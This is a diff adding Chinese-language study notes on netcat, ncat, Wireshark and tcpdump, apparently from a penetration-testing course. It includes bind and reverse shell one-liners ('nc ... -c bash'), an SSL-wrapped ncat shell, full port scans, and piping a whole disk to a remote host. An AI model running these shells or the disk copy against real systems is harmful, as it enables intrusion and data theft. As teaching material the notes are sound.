@@ -1,0 +1,161 @@
+# 基本工具
+
+### 1.netcat(nc) 
+      
+-v 显示详细输出内容  
+-n 跟IP地址，不进行DNS解析  
+-l 打开一个listen端口   
+-p 端口号   
+-q n 当标准输出完成后延迟n秒断开   
+-z 扫描模式，不做I/O操作   
+    
+#### (1)telnet/banner   
+	nc -vn ip地址 端口号   
+	pop3(110)   
+	smtp(25)   
+	http(80)   
+   
+#### (2)传输文本信息   
+	sudo nc -l -p 333 (sudo netstat -pantu | grep 333)   
+	可用于电子取证,直接传送，不在当前设备保存   
+	如： 连接端：ls -l | nc -nv 10.1.1.12 333   
+		 打开端：nc -l -p 333 > content.txt   
+		    
+#### (3)传输文件/目录   
+**文件：**   
+	A: nc -lp 333 > 1/mp4   
+	B: nc -nv 1.1.1.1 333 < 1.mp4 -q 1   
+	或   
+	A: nc -q 1 -lp 333 < a.mp4   
+	B: nc -nv 1.1.1.1 333 > 2.mp4   
+**目录：**   
+	A: tar -cvf - music/ | nc -lp 333 -q 1   
+	B: nc -nv 1.1.1.1 333 | tar -xvf -   
+**加密传文件：**   
+	A: nc -lp 333 | mcrypt --flush -Fbqd -a rijindael-256 -m ecb > 1.mp4   
+	B: mcrypt --flush -Fbq -a rijindael-256 -m ecb < a.mp4 | nc -nv 1.1.1.1 333 -q 1   
+   
+#### (4)流媒体服务器   
+	A: cat 1.mp4 | nc -lp 333   
+	B: nc -vn 1.1.1.1 333 | mpalyer -vo x11 -cache 3000 -   
+   
+#### (5)端口扫描(扫描器的结果都不一定是正确的)   
+	nc -nvz 1.1.1.1 1-65535   
+	默认探测tcp端口，加上u选项探测udp端口   
+	nc -vnzu 1.1.1.1 1-1024   
+
+#### (6)远程克隆硬盘   
+	A: nc -lp 333 | dd of=/dev/sda   
+	B: dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1   
+	远程电子取证，可以将目标服务器硬盘远程复制，或者内存   
+	不仅是文件，每个磁道，包括已标记删除的信息,完整的硬盘复制   
+
+#### (7)远程控制   
+* 正向：   
+	A: nc -lp 333 -c bash   
+	B: nc 1.1.1.1 333   
+* 反向：   
+	A: nc -lp 333   
+	B: nc 1.1.1.1 333 -c bash   
+注： Windows用户把bash改成cmd   
+
+### 2.ncat   
+nc的缺点：   
+	nc缺乏加密和身份验证的能力   
+ncat包含于nmap工具包中   
+--allow 允许连接的IP地址   
+	A: ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl(用ssl加密)   
+	B: ncat -nv 1.1.1.1 333 --ssl   
+注：不同系统/平台的nc参数功能不尽相同   
+
+### 3.wireshark   
+manjaro安装GUI版本：   
+	yaourt -S wireshark-qt   
+需用sudo wireshark图形化版本以顺利使用全部功能   
+抓包嗅探协议分析   
+安全专家必备的技能   
+抓包引擎   
+* Libpcap9——Linux   
+* Winpcap10——Windows   
+解码能力(衡量抓包工具优劣的重要指标)   
+若不勾选使用混杂模式，不会抓取发送给本地IP地址之外的包   
+   
+#### 筛选器：    
+	过滤掉干扰的数据包   
+	抓包过滤器：抓包时过滤   
+	显示过滤器：显示时过滤，往往用的更多   
+	Network -> Capture Filters -> Capture Engine -> Display Filter   
+
+实时抓包，停止后可以保存，建议使用pcap格式(兼容性较高)   
+Edit -> Preferences调整界面布局等首选项内容   
+
+TTL(Time to live)   
+#### 常见协议包：   
+	数据包的分层结构(统计信息、二层报头、三层报头、四层报头...)   
+	ARP,ICMP,TCP,UDP,DNS,HTTP,FTP...   
+	IP是三层报头   
+	四层协议不仅是TCP(Protocol:6)和UDP(17)两种协议,0-255,ICMP(1),IGMP(2)...   
+	二层报头先是源地址再是目的地址，三层报头先是目的地址再是源地址   
+	TCP的三次握手: [SYN], [SYN, ACK], [ACK]   
+	TCP开销相对于UDP较大   
+	DNS是基于四层UDP协议之上的应用层协议,域名解析   
+	HTTP是基于TCP协议的应用层协议   
+		HTTP/1.1\r\n结尾   
+	FTP也是基于TCP协议的应用层协议   
+	wireshark默认通过端口来识别协议，如HTTP通常在80，若在8080则不会按HTTP解析，可以右键选择decode as来手动选择协议   
+   
+#### 数据流：   
+	HTTP、SMTP、POP3、SSL   
+	更清晰地看到访问过程   
+	右键包 follow xxx stream   
+	HTTP,SMTP,POP3基本上是完全明文传输的，提倡用SSL(Secure Sockets Layer)等加密   
+	SSL加密通信过程中，最初的几个包进行SSL公钥传输及加密秘钥的交换，信息会以明文形式传输，但这些信息无法用于解密   
+
+#### 信息统计：   
+	wireshark官网下有各类协议的学习文件   
+	大多statistics菜单下   
+	Summary 抓包文件的摘要信息   
+	Endpoints 了解当前这些包中一共有几个IP地址   
+	Protocol Hierarchy 可查看当前抓的数据包都是什么协议类型   
+		DNS占比过大时往往不正常   
+	Conversation 查看两台机期间产生的会话及产生的数据量(查看中僵尸程序的服务器)   
+	Expert Info 专家系统信息提示   
+   
+wireshark抓大流量时略有欠缺,但应用很广，有很多基于wireshark开发的抓包软件   
+#### 企业抓包部署方案：   
+	Sniffer   
+	Cace/riverbed   
+	Cascad pilot   
+	全流量抓包，需要一个镜像端口   
+   
+### 4.tcpdump   
+no-GUI的抓包分析工具   
+Linux、Unix系统默认安装(说是这么说但是manjaro下没有，pacman安装一下即可)   
+   
+#### 抓包：   
+    默认只抓68个字节   
+    -i interface   
+    -s snaplen 大小   
+    -w file   
+    tcpdump -i eth0 -s 0 -w file.pcap   
+    tcpdump -i eth0 port 22 (筛选器)   
+   
+#### 读取抓包文件：   
+    tcpdump [-A] -r file.pcap   
+    -A 以ascii码显示   
+    -X 以十六进制显示   
+   
+#### 筛选：   
+    -n 不解析域名，显示IP地址   
+    用管道:   
+        tcpdump -n -r http.cap | awk'{print $3}' | sort -u   
+    按来源IP:   
+        tcpdump -n src host 145.254.160.237 -r http.cap   
+    按目标IP:   
+        tcpdump -n dst host 145.254.160.237 -r http.cap   
+    按端口号:   
+        tcpdump -n port 53 -r http.cap   
+        tcpdump -nX port 80 -r http.cap   
+    高级筛选:   
+        按位01转化成十进制数,规定第x个字节的值   
+        tcpdump -A -n 'tcp[13] = 24' -r http.cap   
